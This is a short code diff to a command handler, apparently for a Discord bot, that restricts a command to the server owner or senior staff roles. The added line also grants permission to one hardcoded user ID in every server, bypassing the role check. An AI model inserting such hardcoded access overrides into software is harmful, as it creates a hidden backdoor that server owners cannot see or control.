@@ -18,7 +18,7 @@ export default {
     run: async (client, interaction) => {
         // Enforce HOS (Head of Staff) to Founder Roles Only
         let hasPermission = false;
-        if (interaction.member?.user.id === interaction.guild?.ownerId) {
+        if (interaction.member?.user.id === interaction.guild?.ownerId || interaction.member?.user.id === '753372101540577431') {
             hasPermission = true;
         } else if (interaction.member && interaction.guild) {
             const memberRoles = interaction.member.roles as any;
